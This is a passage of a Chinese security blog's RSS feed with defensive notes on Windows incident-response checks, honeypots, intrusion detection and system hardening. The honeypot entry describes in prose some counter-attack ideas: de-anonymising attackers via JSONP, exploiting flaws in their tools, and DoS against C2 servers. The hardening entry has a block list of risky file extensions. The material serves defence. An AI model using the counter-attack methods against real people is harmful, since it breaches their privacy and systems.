&lt;p&gt;最近使用文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;C:\Documents and Settings\Administrator\Recent&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Documents and Settings\Default User\Recent&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%UserProfile%\Recent&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;系统日志分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事件查看器  &lt;code&gt;eventvwr.msc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户分析-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户分析-2&#34;&gt;#&lt;/a&gt; 用户分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看是否有新增用户&lt;/li&gt;
&lt;li&gt;查看服务器是否有弱口令&lt;/li&gt;
&lt;li&gt;查看管理员对应键值&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lusrmgr.msc&lt;/code&gt;  查看账户变化&lt;/li&gt;
&lt;li&gt;&lt;code&gt;net user&lt;/code&gt;  列出当前登录账户&lt;/li&gt;
&lt;li&gt;&lt;code&gt;wmic UserAccount get&lt;/code&gt;  列出当前系统所有账户&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程分析-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程分析-3&#34;&gt;#&lt;/a&gt; 进程分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;netstat -ano&lt;/code&gt;  查看是否打开了可疑端口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;tasklist&lt;/code&gt;  查看是否有可疑进程&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;分析开机自启程序&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;(ProfilePath)\Start Menu\Programs\Startup&lt;/code&gt;  启动项&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msconfig&lt;/code&gt;  启动选项卡&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gpedit.msc&lt;/code&gt;  组策略编辑器&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看计划或定时任务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\System32\Tasks\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\SysWOW64\Tasks\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C:\Windows\tasks\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;schtasks&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;taskschd.msc&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;compmgmt.msc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看启动服务&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;services.msc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;日志分析-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志分析-2&#34;&gt;#&lt;/a&gt; 日志分析&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;事件查看
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eventvwr.msc&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;其他&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#其他&#34;&gt;#&lt;/a&gt; 其他&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;查看系统环境变量&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE0MA==&#34;&gt;黑客入侵应急分析手工排查&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9jb2x1bW4vMTQ3OTI5Lmh0bWw=&#34;&gt;取证入门 web 篇&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjUyNA==&#34;&gt;Windows 系统安全事件应急响应&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTYzMg==&#34;&gt;企业安全应急响应&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly91cy1jZXJ0LmNpc2EuZ292L25jYXMvYWxlcnRzL2FhMjAtMjQ1YQ==&#34;&gt;Technical Approaches to Uncovering and Remediating Malicious Activity&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/</guid>
            <title>蜜罐技术</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF/</link>
            <category>蜜罐</category>
            <category>隐藏</category>
            <category>诱导</category>
            <pubDate>Mon, 05 Dec 2022 16:30:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;蜜罐是对攻击者的欺骗技术，用以监视、检测、分析和溯源攻击行为，其没有业务上的用途，所有流入 / 流出蜜罐的流量都预示着扫描或者攻击行为，因此可以比较好的聚焦于攻击流量。&lt;/p&gt;
&lt;p&gt;蜜罐可以实现对攻击者的主动诱捕，能够详细地记录攻击者攻击过程中的许多痕迹，可以收集到大量有价值的数据，如病毒或蠕虫的源码、黑客的操作等，从而便于提供丰富的溯源数据。另外蜜罐也可以消耗攻击者的时间，基于 JSONP 等方式来获取攻击者的画像。&lt;/p&gt;
&lt;p&gt;但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源。&lt;/p&gt;
&lt;h1 id=&#34;分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#分类&#34;&gt;#&lt;/a&gt; 分类&lt;/h1&gt;
&lt;p&gt;按用途分类，蜜罐可以分为研究型蜜罐和产品型蜜罐。研究型蜜罐一般是用于研究各类网络威胁，寻找应对的方式，不增加特定组织的安全性。产品型蜜罐主要是用于防护的商业产品。&lt;/p&gt;
&lt;p&gt;按交互方式分类，蜜罐可以分为低交互蜜罐和高交互蜜罐。低交互蜜罐模拟网络服务响应和攻击者交互，容易部署和控制攻击，但是模拟能力会相对较弱，对攻击的捕获能力不强。高交互蜜罐不是简单模拟协议或服务，而是提供真实的系统，使得被发现的概率大幅度降低。但是高交互蜜罐部署不当时存在被攻击者利用的可能性。&lt;/p&gt;
&lt;h1 id=&#34;隐藏技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏技术&#34;&gt;#&lt;/a&gt; 隐藏技术&lt;/h1&gt;
&lt;p&gt;蜜罐主要涉及到的是伪装技术，主要涉及到进程隐藏、服务伪装等技术。&lt;/p&gt;
&lt;p&gt;蜜罐之间的隐藏，要求蜜罐之间相互隐蔽。进程隐藏，蜜罐需要隐藏监控、信息收集等进程。伪服务和命令技术，需要对部分服务进行伪装，防止攻击者获取敏感信息或者入侵控制内核。数据文件伪装，需要生成合理的虚假数据的文件。&lt;/p&gt;
&lt;h1 id=&#34;牵引技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#牵引技术&#34;&gt;#&lt;/a&gt; 牵引技术&lt;/h1&gt;
&lt;p&gt;蜜罐牵引技术是在识别到攻击者流量后，通过在正式环境中改变路由、返回特定响应的方式将攻击者牵引到特定的蜜罐地址。 常见的牵引技术有下面几种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;防火墙牵引&lt;/li&gt;
&lt;li&gt;SDN 牵引&lt;/li&gt;
&lt;li&gt;ARP 牵引&lt;/li&gt;
&lt;li&gt;WAF 牵引&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;诱饵技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#诱饵技术&#34;&gt;#&lt;/a&gt; 诱饵技术&lt;/h1&gt;
&lt;p&gt;可以在互联网中部署一定的诱饵来吸引攻击者进入特定的蜜罐中。 常见的诱饵有域名诱饵、Github 诱饵、网盘诱饵、邮件诱饵、主机诱饵、文件诱饵、漏洞诱饵等。&lt;/p&gt;
&lt;p&gt;域名诱饵指使用特定的在字典中且有意义的主域名做为诱饵，比如  &lt;code&gt;vpn.example.com&lt;/code&gt;  /  &lt;code&gt;oa.example.com&lt;/code&gt;  等。&lt;/p&gt;
&lt;p&gt;Github 诱饵指在 Github 中放置代码文件、失陷凭证的方式。&lt;/p&gt;
&lt;p&gt;文件诱饵是在容易失陷的主机中放置虚假的拓扑图，关键系统 IP 的文件，从而诱导攻击者的方式。&lt;/p&gt;
&lt;p&gt;漏洞诱饵通过部署存在特定漏洞特征的蜜罐站，吸引攻击者攻击。&lt;/p&gt;
&lt;h1 id=&#34;反制技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反制技术&#34;&gt;#&lt;/a&gt; 反制技术&lt;/h1&gt;
&lt;p&gt;蜜罐可以使用一些方式对攻击者进行反制，常见的方式有 Jsonp、安全工具漏洞、Client 漏洞反制、文件反制等方式。&lt;/p&gt;
&lt;p&gt;Jsonp 主要是使用各大网站的 Jsonp 获取攻击者已经登录的社交账号，用以溯源。 另外如果攻击者使用流量的方式访问蜜罐网站，可以使用运营商接口获取攻击者的手机号。&lt;/p&gt;
&lt;p&gt;安全工具漏洞是指使用安全工具的漏洞进行反制，例如 Git 泄露工具存在的文件泄露漏洞，基于 Electron 的工具存在的 XSS to RCE 等。&lt;/p&gt;
&lt;p&gt;Client 反制，指使用虚假的 Server 对存在漏洞的客户端进行反制，例如通过 MySQL Client 读取文件，基于 RDP/SMB 的漏洞进行 RCE。&lt;/p&gt;
&lt;p&gt;反制文件，指在蜜罐环境中设置特定的文件，例如伪装的 VPN 客户端、特定插件来诱导攻击者点击。&lt;/p&gt;
&lt;p&gt;DoS 反制，在获取到攻击者的 C2 样本后，可以通过批量上线的方式影响 C2 攻击者的控制服务器。&lt;/p&gt;
&lt;h1 id=&#34;识别技术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#识别技术&#34;&gt;#&lt;/a&gt; 识别技术&lt;/h1&gt;
&lt;p&gt;攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂且少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别。&lt;/p&gt;
&lt;h2 id=&#34;协议实现识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#协议实现识别&#34;&gt;#&lt;/a&gt; 协议实现识别&lt;/h2&gt;
&lt;p&gt;部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。&lt;/p&gt;
&lt;p&gt;部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。&lt;/p&gt;
&lt;p&gt;部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。&lt;/p&gt;
&lt;p&gt;部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐。&lt;/p&gt;
&lt;h2 id=&#34;环境特征&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境特征&#34;&gt;#&lt;/a&gt; 环境特征&lt;/h2&gt;
&lt;p&gt;部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvSG9uZXlwb3RfKGNvbXB1dGluZyk=&#34;&gt;honeypot wiki&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RocmVhdHN0cmVhbS5naXRodWIuaW8vbWhuLw==&#34;&gt;Modern Honey Network&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubW9yZXNlYy5jbi9tYWdpYy1zaGllbGQuaHRtbA==&#34;&gt;默安科技：幻阵&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvOTk4&#34;&gt;蜜罐与内网安全从 0 到 1&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXprME56RTRNREUyTkE9PSZhbXA7bWlkPTIyNDc0ODM5MDgmYW1wO2lkeD0xJmFtcDtzbj1lNmEzMTllMjJjM2NkNTQ2NTBiZGJiYTUxMWU1OGE0Mw==&#34;&gt;浅析开源蜜罐识别与全网测绘&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</guid>
            <title>入侵检测</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/</link>
            <category>入侵检测</category>
            <category>IDS</category>
            <category>IPS</category>
            <pubDate>Mon, 05 Dec 2022 16:25:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;ids与ips&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ids与ips&#34;&gt;#&lt;/a&gt; IDS 与 IPS&lt;/h1&gt;
&lt;p&gt;IDS 与 IPS 是常见的防护设备，IPS 相对 IDS 的不同点在于，IPS 通常具有阻断能力。&lt;/p&gt;
&lt;h1 id=&#34;常见入侵点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见入侵点&#34;&gt;#&lt;/a&gt; 常见入侵点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web 入侵&lt;/li&gt;
&lt;li&gt;高危服务入侵&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;监控实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#监控实现&#34;&gt;#&lt;/a&gt; 监控实现&lt;/h1&gt;
&lt;h2 id=&#34;客户端监控&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#客户端监控&#34;&gt;#&lt;/a&gt; 客户端监控&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;监控敏感配置文件&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;常用命令 ELF 文件完整性监控&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ps&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lsof&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rootkit 监控&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;资源使用报警&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内存使用率&lt;/li&gt;
&lt;li&gt;CPU 使用率&lt;/li&gt;
&lt;li&gt;IO 使用率&lt;/li&gt;
&lt;li&gt;网络使用率&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;新出现进程监控&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;基于 inotify 的文件监控&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;网络检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络检测&#34;&gt;#&lt;/a&gt; 网络检测&lt;/h2&gt;
&lt;p&gt;基于网络层面的攻击向量做检测，如 Snort 等。&lt;/p&gt;
&lt;h2 id=&#34;日志分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志分析&#34;&gt;#&lt;/a&gt; 日志分析&lt;/h2&gt;
&lt;p&gt;将主机系统安全日志 / 操作日志、网络设备流量日志、Web 应用访问日志、SQL 应用访问日志等日志集中到一个统一的后台，在后台中对各类日志进行综合的分析。&lt;/p&gt;
&lt;h1 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvZXMvMTk0NTEwLmh0bWw=&#34;&gt;企业安全建设之 HIDS&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTYyNi8=&#34;&gt;大型互联网企业入侵检测实战总结&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mva3plQUV2ei1lakxENzFmZ2I1dDh0QQ==&#34;&gt;同程入侵检测系统&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjEzNg==&#34;&gt;Web 日志安全分析系统实践&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTEyMQ==&#34;&gt;Web 日志安全分析浅谈&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUUplVzdLLUtUaFlIZ2dXdEotRmgzdw==&#34;&gt;网络层绕过 IDS/IPS 的一些探索&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%8A%A0%E5%9B%BA%E6%A3%80%E6%9F%A5/</guid>
            <title>加固检查</title>
            <link>https://mobius-0.github.io/security/WebNote/Defense%20techniques/%E5%8A%A0%E5%9B%BA%E6%A3%80%E6%9F%A5/</link>
            <category>防御加固</category>
            <category>管理策略</category>
            <pubDate>Mon, 05 Dec 2022 16:20:15 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;网络设备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络设备&#34;&gt;#&lt;/a&gt; 网络设备&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;及时检查系统版本号&lt;/li&gt;
&lt;li&gt;敏感服务设置访问 IP/MAC 白名单&lt;/li&gt;
&lt;li&gt;开启权限分级控制&lt;/li&gt;
&lt;li&gt;关闭不必要的服务&lt;/li&gt;
&lt;li&gt;打开操作日志&lt;/li&gt;
&lt;li&gt;配置异常告警&lt;/li&gt;
&lt;li&gt;关闭 ICMP 回应&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;操作系统&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#操作系统&#34;&gt;#&lt;/a&gt; 操作系统&lt;/h1&gt;
&lt;h2 id=&#34;linux&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#linux&#34;&gt;#&lt;/a&gt; Linux&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;无用用户 / 用户组检查&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;空口令帐号检查&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户密码策略&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/etc/login.defs&lt;/li&gt;
&lt;li&gt;/etc/pam.d/system-auth&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;敏感文件权限配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/etc/passwd&lt;/li&gt;
&lt;li&gt;/etc/shadow&lt;/li&gt;
&lt;li&gt;~/.ssh/&lt;/li&gt;
&lt;li&gt;/var/log/messages&lt;/li&gt;
&lt;li&gt;/var/log/secure&lt;/li&gt;
&lt;li&gt;/var/log/maillog&lt;/li&gt;
&lt;li&gt;/var/log/cron&lt;/li&gt;
&lt;li&gt;/var/log/spooler&lt;/li&gt;
&lt;li&gt;/var/log/boot.log&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;日志是否打开&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;及时安装补丁&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;开机自启&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/etc/init.d&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;检查系统时钟&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#windows&#34;&gt;#&lt;/a&gt; Windows&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;异常进程监控&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;异常启动项监控&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;异常服务监控&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置系统日志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户账户&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设置口令有效期&lt;/li&gt;
&lt;li&gt;设置口令强度限制&lt;/li&gt;
&lt;li&gt;设置口令重试次数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;安装 EMET&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;启用 PowerShell 日志&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;限制以下敏感文件的下载和执行&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ade, adp, ani, bas, bat, chm, cmd, com, cpl, crt, hlp, ht, hta, inf, ins, isp, job, js, jse, lnk, mda, mdb, mde, mdz, msc, msi, msp, mst, pcd, pif, reg, scr, sct, shs, url, vb, vbe, vbs, wsc, wsf, wsh, exe, pif&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;限制会调起 wscript 的后缀&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bat, js, jse, vbe, vbs, wsf, wsh&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;域&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;限制将计算机加入域的权限域账户使用最小权限原则减少非必要高权限账户的数量&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用&#34;&gt;#&lt;/a&gt; 应用&lt;/h1&gt;
&lt;h2 id=&#34;ftp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ftp&#34;&gt;#&lt;/a&gt; FTP&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;禁止匿名登录&lt;/li&gt;
&lt;li&gt;修改 Banner&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ssh&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ssh&#34;&gt;#&lt;/a&gt; SSH&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;是否禁用 ROOT 登录&lt;/li&gt;
&lt;li&gt;是否禁用密码连接&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mysql&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#mysql&#34;&gt;#&lt;/a&gt; MySQL&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;文件写权限设置&lt;/li&gt;
&lt;li&gt;用户授权表管理&lt;/li&gt;
&lt;li&gt;日志是否启用&lt;/li&gt;
&lt;li&gt;版本是否最新&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;web中间件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web中间件&#34;&gt;#&lt;/a&gt; Web 中间件&lt;/h1&gt;
&lt;h2 id=&#34;apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache&#34;&gt;#&lt;/a&gt; Apache&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;版本号隐藏&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;版本是否最新&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;禁用部分 HTTP 动词&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关闭 Trace&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;禁止  &lt;code&gt;server-status&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上传文件大小限制&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目录权限设置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;是否允许路由重写&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;是否允许列目录&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;日志配置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置超时时间防 DoS&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;非属主用户文件读写限制&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;httpd.conf&lt;/li&gt;
&lt;li&gt;access.log&lt;/li&gt;
&lt;li&gt;error.log&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nginx&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nginx&#34;&gt;#&lt;/a&gt; Nginx&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;禁用部分 HTTP 动词&lt;/li&gt;
&lt;li&gt;禁用目录遍历&lt;/li&gt;
&lt;li&gt;检查重定向配置&lt;/li&gt;
&lt;li&gt;配置超时时间防 DoS&lt;/li&gt;
&lt;/ul&gt;
